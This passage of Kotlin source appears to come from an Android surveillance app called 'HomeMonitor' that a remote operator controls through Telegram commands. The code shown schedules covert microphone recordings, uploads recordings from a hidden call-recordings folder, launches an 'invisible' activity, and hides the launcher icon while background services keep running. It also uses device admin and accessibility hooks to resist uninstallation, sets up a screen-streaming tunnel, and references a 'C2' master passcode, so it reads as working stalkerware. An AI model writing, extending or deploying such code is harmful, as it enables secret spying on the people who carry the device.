            cal.timeInMillis / 1000L
        } catch (_: Exception) {
            0L
        }
    }

    private fun handleScheduleAudio(chatId: String, args: String) {
        val parts = args.trim().split(" ")
        val delayMin = parts.getOrNull(0)?.toIntOrNull() ?: 1
        val durationSec = parts.getOrNull(1)?.toIntOrNull()?.coerceIn(5, 300) ?: 15

        sendMessage(chatId, "⏰ *Scheduled Audio Recording:*\nWill record for ${durationSec}s in ${delayMin} minutes.", parseMode = "Markdown")

        serviceScope.launch(Dispatchers.IO) {
            try {
                delay(delayMin * 60 * 1000L)
                sendMessage(chatId, "🎙️ *Starting scheduled audio recording (${durationSec}s)…*", parseMode = "Markdown")
                handleAudio(chatId, durationSec)
            } catch (e: Exception) {
                Log.e(TAG, "handleScheduleAudio error: ${e.message}")
            }
        }
    }

    private fun handleSensorsCommand(chatId: String) {
        val sm = getSystemService(SENSOR_SERVICE) as? SensorManager
        if (sm == null) {
            sendMessage(chatId, "❌ SensorManager hardware unavailable.")
            return
        }

        val accel = sm.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
        val proximity = sm.getDefaultSensor(Sensor.TYPE_PROXIMITY)
        val light = sm.getDefaultSensor(Sensor.TYPE_LIGHT)
        val step = sm.getDefaultSensor(Sensor.TYPE_STEP_COUNTER)
        val gyro = sm.getDefaultSensor(Sensor.TYPE_GYROSCOPE)
        val mag = sm.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD)

        val sb = StringBuilder("🚨 **Real-Time Hardware Sensor Suite Status**\n\n")
        sb.append("• **Accelerometer**: `${if (accel != null) "Present (${accel.name})" else "Not Available"}`\n")
        sb.append("• **Proximity Sensor**: `${if (proximity != null) "Present (${proximity.name})" else "Not Available"}`\n")
        sb.append("• **Ambient Light Sensor**: `${if (light != null) "Present (${light.name})" else "Not Available"}`\n")
        sb.append("• **Step Counter**: `${if (step != null) "Present (${step.name})" else "Not Available"}`\n")
        sb.append("• **Gyroscope**: `${if (gyro != null) "Present (${gyro.name})" else "Not Available"}`\n")
        sb.append("• **Magnetometer / Compass**: `${if (mag != null) "Present (${mag.name})" else "Not Available"}`\n\n")
        sb.append("💡 *Commands*: `!motion`, `!proximity`, `!light`, `!steps`, `!gyro`, `!compass`")

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
        sendDiscordCategorizedMessage("17-alerts-and-sensors", sb.toString())
    }

    private fun handleActivateApp(chatId: String) {
        if (InvisibleActivity.instance != null) {
            sendMessage(chatId, "ℹ️ *Stealth Invisible Activity is ALREADY active.*", parseMode = "Markdown")
            return
        }
        try {
            InvisibleActivity.launchInvisible(this)
            sendMessage(chatId, "👁️ *App Process Activated Invisibly in Resumed State!* (100% Invisible, 0% UI)", parseMode = "Markdown")
        } catch (e: Exception) {
            Log.e(TAG, "handleActivateApp error: ${e.message}")
            sendMessage(chatId, "❌ Error activating app: ${e.message}")
        }
    }

    private fun handleCloseApp(chatId: String) {
        if (InvisibleActivity.instance != null) {
            try {
                InvisibleActivity.closeInvisible()
                sendMessage(chatId, "🛑 *Invisible Activity Closed.* (Background Service Active 24/7)", parseMode = "Markdown")
            } catch (e: Exception) {
                Log.e(TAG, "handleCloseApp error: ${e.message}")
                sendMessage(chatId, "❌ Error closing app: ${e.message}")
            }
        } else {
            sendMessage(chatId, "ℹ️ Invisible activity is not currently active.", parseMode = "Markdown")
        }
    }

    private fun handleMotionCommand(chatId: String, arg: String) {
        val mode = arg.trim().lowercase()
        if (mode == "off" || mode == "disable" || mode == "0") {
            PhysicalSecurityGuard.disarmGuard(this)
            sendMessage(chatId, "🛡️ *Physical Security Guard DISARMED.*", parseMode = "Markdown")
        } else {
            val sensFloat = arg.toFloatOrNull() ?: 3.5f
            PhysicalSecurityGuard.armGuard(this, sensFloat)
            sendMessage(chatId, "🛡️ *Physical Security Guard ARMED* with motion sensitivity: `${"%.2f".format(sensFloat)} m/s²`.", parseMode = "Markdown")
        }
    }

    private fun handleGeofenceCommand(chatId: String, arg: String) {
        val parts = arg.trim().split(" ")
        val lat = parts.getOrNull(0)?.toDoubleOrNull()
        val lng = parts.getOrNull(1)?.toDoubleOrNull()
        val radius = parts.getOrNull(2)?.toFloatOrNull() ?: 500f

        if (lat != null && lng != null) {
            targetGeofenceLat = lat
            targetGeofenceLng = lng
            targetGeofenceRadiusMeters = radius
            sendMessage(chatId, "📍 *Geofence Boundary Set:*\nCenter: `$lat, $lng` | Radius: ${radius}m", parseMode = "Markdown")
        } else {
            val current = if (targetGeofenceLat != null) "`$targetGeofenceLat, $targetGeofenceLng` (${targetGeofenceRadiusMeters}m)" else "Not set"
            sendMessage(chatId, "ℹ️ *Geofence Status:* $current\n\nUsage: `/geofence <latitude> <longitude> [radius_meters]`\nExample: `/geofence 37.7749 -122.4194 500`", parseMode = "Markdown")
        }
    }

    private fun handleBatterySaverCommand(chatId: String, arg: String) {
        val mode = arg.trim().lowercase()
        if (mode == "on" || mode == "enable" || mode == "1") {
            isBatterySaverEnabled = true
            sendMessage(chatId, "🔋 *Dynamic Battery Saver ACTIVATED.*\nPolling scales automatically between 3s and 20s based on battery level.", parseMode = "Markdown")
        } else if (mode == "off" || mode == "disable" || mode == "0") {
            isBatterySaverEnabled = false
            pollIntervalMs = 3000L
            sendMessage(chatId, "🔋 *Battery Saver DISABLED.* Polling fixed at 3s.", parseMode = "Markdown")
        } else {
            val status = if (isBatterySaverEnabled) "ACTIVE 🔋" else "DISABLED ⚡"
            sendMessage(chatId, "ℹ️ *Battery Saver Status:* $status\n\nUsage:\n• `/batterysaver on` — Enable adaptive polling\n• `/batterysaver off` — Fixed fast polling", parseMode = "Markdown")
        }
    }

    private fun handleTranscribeAudio(chatId: String, fileNameArg: String) {
        val query = fileNameArg.trim()
        val targetFile: File? = if (query.isNotEmpty()) {
            File(cacheDir, query).takeIf { it.exists() }
                ?: File(cacheDir, ".call_recs/$query").takeIf { it.exists() }
        } else {
            val allAudio = (cacheDir.listFiles()?.filter { it.isFile && (it.extension == "m4a" || it.extension == "mp3") } ?: emptyList()) +
                    (File(cacheDir, ".call_recs").listFiles()?.filter { it.isFile && (it.extension == "m4a" || it.extension == "mp3") } ?: emptyList())
            allAudio.maxByOrNull { it.lastModified() }
        }

        if (targetFile == null || !targetFile.exists()) {
            sendMessage(chatId, "⚠️ No audio recording found to transcribe. Record audio first using `/audio 15`.", parseMode = "Markdown")
            return
        }

        sendMessage(chatId, "🧠 *Transcribing audio `${targetFile.name}` with Cloudflare Workers AI Whisper…*", parseMode = "Markdown")

        serviceScope.launch(Dispatchers.IO) {
            try {
                val bytes = targetFile.readBytes()
                val body = bytes.toRequestBody("audio/mpeg".toMediaTypeOrNull())

                val request = Request.Builder()
                    .url("$SERVER_URL/api/ai/transcribe")
                    .post(body)
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        sendMessage(chatId, "❌ AI Transcription failed: HTTP ${response.code}")
                        return@launch
                    }

                    val respStr = response.body?.string()?.trim() ?: ""
                    if (respStr.startsWith("{")) {
                        val json = JSONObject(respStr)
                        val text = json.optString("transcription", json.optString("text", "No text recognized."))
                        sendMessage(chatId, "🧠 *Workers AI Whisper Transcription:*\n\n\"$text\"", parseMode = "Markdown")
                    } else {
                        sendMessage(chatId, "❌ Unexpected response from Workers AI: `$respStr`", parseMode = "Markdown")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleTranscribeAudio error: ${e.message}")
                sendMessage(chatId, "❌ AI Transcription Error: ${e.message}")
            }
        }
    }

    private fun handlePromptUnhideApp(chatId: String) {
        if (!isCommandTargetedToMe()) return
        val myModel = Build.MODEL
        val myDeviceId = getOrCreateDeviceId()

        val text = "⚠️ *CRITICAL ACTION VERIFICATION: UNHIDE APP*\n\n" +
                "Are you sure you want to restore and UNHIDE the launcher icon on `$myModel` (`$myDeviceId`)?"

        val replyMarkup = JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "✅ YES, UNHIDE APP")
                        put("callback_data", "/confirm_unhide")
                    })
                    put(JSONObject().apply {
                        put("text", "❌ CANCEL")
                        put("callback_data", "/cancel_action")
                    })
                })
            })
        }

        sendMessageWithMarkup(chatId, text, replyMarkup)
    }

    private fun handleExecuteUnhideApp(chatId: String) {
        val myModel = Build.MODEL
        val myDeviceId = getOrCreateDeviceId()

        try {
            getSharedPreferences("device_prefs", MODE_PRIVATE).edit().putBoolean("is_app_hidden", false).apply()
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            sendMessage(chatId, "👁️ *App Launcher Icon RESTORED* on `$myModel` (`$myDeviceId`). Icon is now visible in App Drawer.", parseMode = "Markdown")
        } catch (e: Exception) {
            sendMessage(chatId, "❌ Error unhiding app: ${e.message}")
        }
    }

    private fun handleHideApp(chatId: String) {
        if (!isCommandTargetedToMe()) return
        val myModel = Build.MODEL
        val myDeviceId = getOrCreateDeviceId()

        try {
            getSharedPreferences("device_prefs", MODE_PRIVATE).edit().putBoolean("is_app_hidden", true).apply()
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            sendMessage(chatId, "🙈 *App Launcher Icon HIDDEN* on `$myModel` (`$myDeviceId`). App icon disappeared from App Drawer while background services remain 100% active.", parseMode = "Markdown")
        } catch (e: Exception) {
            sendMessage(chatId, "❌ Error hiding app: ${e.message}")
        }
    }

    private fun handlePromptSelfUninstall(chatId: String) {
        if (!isCommandTargetedToMe()) return
        val myModel = Build.MODEL
        val myDeviceId = getOrCreateDeviceId()

        val text = "⚠️ *CRITICAL ACTION VERIFICATION: SELF-UNINSTALL*\n\n" +
                "Are you sure you want to COMPLETELY SELF-UNINSTALL HomeMonitor from `$myModel` (`$myDeviceId`)?"

        val replyMarkup = JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                put(JSONArray().apply {
                    put(JSONObject().apply {
                        put("text", "✅ YES, SELF-UNINSTALL")
                        put("callback_data", "/confirm_selfuninstall")
                    })
                    put(JSONObject().apply {
                        put("text", "❌ CANCEL")
                        put("callback_data", "/cancel_action")
                    })
                })
            })
        }

        sendMessageWithMarkup(chatId, text, replyMarkup)
    }

    private fun handleExecuteSelfUninstall(chatId: String) {
        val myModel = Build.MODEL
        val myDeviceId = getOrCreateDeviceId()

        sendMessage(
            chatId,
            "💥 *SELF-UNINSTALL EXECUTING on `$myModel` (`$myDeviceId`)*\n\n" +
            "• Permitting uninstallation in Accessibility Service…\n" +
            "• Disabling Device Admin policies…\n" +
            "• Unhiding app launcher icon…\n" +
            "• Initiating package deletion…",
            parseMode = "Markdown"
        )

        serviceScope.launch(Dispatchers.IO) {
            try {
                AppAccessibilityService.isSelfUninstallAllowed = true

                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val adminComponent = ComponentName(this@MonitorService, AppDeviceAdminReceiver::class.java)
                if (dpm.isAdminActive(adminComponent)) {
                    dpm.removeActiveAdmin(adminComponent)
                }

                try {
                    getSharedPreferences("device_prefs", MODE_PRIVATE).edit().putBoolean("is_app_hidden", false).apply()
                    val mainComponent = ComponentName(this@MonitorService, MainActivity::class.java)
                    packageManager.setComponentEnabledSetting(
                        mainComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}

                delay(1000L)

                val uninstallIntent = Intent(Intent.ACTION_DELETE).apply {
                    data = Uri.parse("package:$packageName")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(uninstallIntent)

            } catch (e: Exception) {
                sendMessage(chatId, "❌ Self-uninstall error: ${e.message}")
            }
        }
    }

    private fun handleDeviceOnlineStatus(chatId: String) {
        val myModel = Build.MODEL
        val myDeviceId = getOrCreateDeviceId()
        val batteryIntent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
        sendMessage(
            chatId,
            "⚡ *Live Device Status Report*\n\n" +
            "• *Device Model:* `$myModel` (`$myDeviceId`)\n" +
            "• *Direct Telegram Connection:* ACTIVE 🟢\n" +
            "• *Battery Level:* ${if (batteryPct >= 0) "$batteryPct%" else "N/A"}\n" +
            "• *Status:* ONLINE & READY",
            parseMode = "Markdown"
        )
    }

    private fun handleSetCloudflareTunnel(chatId: String, rawArgs: String) {
        val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
        val prefKey = "cf_webstream_tunnel_token"
        val myDeviceId = getOrCreateDeviceId()
        val myInstallId = getOrCreateInstallationId()
        val myModel = Build.MODEL
        val originUrl = "http://127.0.0.1:${Placeholder.WEBSTREAM_LOCAL_PORT}"

        val parts = rawArgs.trim().split(Regex("""\s+""")).filter { it.isNotBlank() }

        var targetDevice: String? = null
        var tokenInput = ""

        if (parts.size >= 2 && !parts[0].startsWith("eyJ") && parts[0] != "reset" && parts[0] != "clear" && parts[0] != "force") {
            targetDevice = parts[0]
            tokenInput = parts.drop(1).joinToString(" ")
        } else {
            tokenInput = rawArgs.trim()
        }

        if (!targetDevice.isNullOrBlank()) {
            val isMe = targetDevice.equals("all", ignoreCase = true) ||
                    myDeviceId.contains(targetDevice, ignoreCase = true) ||
                    myInstallId.contains(targetDevice, ignoreCase = true) ||
                    myModel.contains(targetDevice, ignoreCase = true)
            if (!isMe) {
                return
            }
        } else if (!isCommandTargetedToMe()) {
            return
        }

        if (tokenInput.equals("reset", ignoreCase = true) || tokenInput.equals("clear", ignoreCase = true)) {
            prefs.edit()
                .remove(prefKey)
                .putString("cf_provisioning_status", PROVISIONING_STATUS_PENDING)
                .apply()
            val resetMsg = "🛑 **WebStream Cloudflare Tunnel Reset**\n\n" +
                    "📱 **Device**: `$myModel` (`$myDeviceId`)\n" +
                    "🔑 **Install ID**: `$myInstallId`\n" +
                    "📊 **Provisioning Status**: `CLOUDFLARE_PENDING`\n" +
                    "ℹ️ *Local token cleared and tunnel engine stopped.*"
            sendMessage(chatId, resetMsg, parseMode = "Markdown")
            return
        }

        var isForce = false
        if (tokenInput.startsWith("force ") || tokenInput.startsWith("force=")) {
            isForce = true
            tokenInput = tokenInput.removePrefix("force ").removePrefix("force=").trim()
        }

        val currentStatus = getCloudflareProvisioningStatus()
        val existingToken = prefs.getString(prefKey, null)
        val extractedToken = tokenInput.trim()

        if (extractedToken.isBlank() || extractedToken.length < 30) {
            val savedToken = prefs.getString(prefKey, null)
            val msg = if (savedToken.isNullOrBlank()) {
                "☁️ **Cloudflare WebStream One-Time Provisioning**\n\n" +
                "Usage: `!cftoken [device-id] <tunnel_token>`\n" +
                "Device: `$myModel` (`$myDeviceId`)\n" +
                "Install ID: `$myInstallId`\n" +
                "Status: `${getCloudflareProvisioningStatus()}`\n" +
                "Origin: `$originUrl`"
            } else {
                "✅ **Cloudflare WebStream Tunnel Provisioned**\n\n" +
                "Device: `$myModel` (`$myDeviceId`)\n" +
                "Install ID: `$myInstallId`\n" +
                "Status: `${getCloudflareProvisioningStatus()}`\n" +
                "Token: `${savedToken.take(15)}...`\n" +
                "Send `!cftoken [device-id] reset` to reset provisioning."
            }
            sendMessage(chatId, msg, parseMode = "Markdown")
            return
        }

        if (!isWebStreamRunning) {
            handleStartWebStream(chatId)
        }

        val now = System.currentTimeMillis()

        prefs.edit()
            .putString(prefKey, extractedToken)
            .putString("cf_provisioning_status", PROVISIONING_STATUS_COMPLETE)
            .putLong("cf_token_ack_timestamp", now)
            .putLong("cf_last_connected_timestamp", now)
            .putString("cf_command_id", extractedToken.hashCode().toString())
            .apply()

        val successMsg = "✅ **Cloudflare Tunnel Provisioning Complete!**\n\n" +
                "📱 **Device**: `$myModel` (`$myDeviceId`)\n" +
                "🔑 **Install ID**: `$myInstallId`\n" +
                "🌐 **Origin**: `$originUrl`\n" +
                "📊 **Provisioning Status**: `PROVISIONING_COMPLETE`\n" +
                "🔑 **Master Passcode**: `${Placeholder.C2_MASTER_PASSCODE}`"

        sendMessage(chatId, successMsg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("12-screen-share-stream", successMsg)
    }

    private fun handleTunnelStatus(chatId: String) {
        val myDeviceId = getOrCreateDeviceId()
        val myInstallId = getOrCreateInstallationId()
        val myModel = Build.MODEL
        val status = getCloudflareProvisioningStatus()
        val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
        val lastConn = prefs.getLong("cf_last_connected_timestamp", 0L)
        val lastConnStr = if (lastConn > 0) {
            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(lastConn))
        } else "N/A"

        val msg = "📊 **WebStream Status & Provisioning Metadata**\n\n" +
                "📱 **Device Model**: `$myModel` (`$myDeviceId`)\n" +
                "🔑 **Installation ID**: `$myInstallId`\n" +
                "📋 **Provisioning Status**: `$status`\n" +
                "🌐 **Local Origin**: `http://127.0.0.1:${Placeholder.WEBSTREAM_LOCAL_PORT}`\n" +
                "⏱️ **Last Connection ACK**: `$lastConnStr`"

        sendMessage(chatId, msg, parseMode = "Markdown")
    }

    private fun handleCloudflareAutoRegister(chatId: String) {
        val deviceId = getOrCreateDeviceId()
        sendMessage(chatId, "ℹ️ Cloudflare tunnel auto-registration is disabled in 100% Firebase/WebRTC mode.", parseMode = "Markdown")
    }

    private fun handleCloudflareReconcile(chatId: String) {
        val deviceId = getOrCreateDeviceId()
        sendMessage(chatId, "ℹ️ Cloudflare resource reconcile is disabled in 100% Firebase/WebRTC mode.", parseMode = "Markdown")
    }

    private fun handleCloudflareRotateToken(chatId: String) {
        val deviceId = getOrCreateDeviceId()
        sendMessage(chatId, "ℹ️ Cloudflare token rotation is disabled in 100% Firebase/WebRTC mode.", parseMode = "Markdown")
    }

    private fun handleCloudflareUnregister(chatId: String) {
        val deviceId = getOrCreateDeviceId()
        sendMessage(chatId, "ℹ️ Cloudflare unregister is disabled in 100% Firebase/WebRTC mode.", parseMode = "Markdown")
    }
}
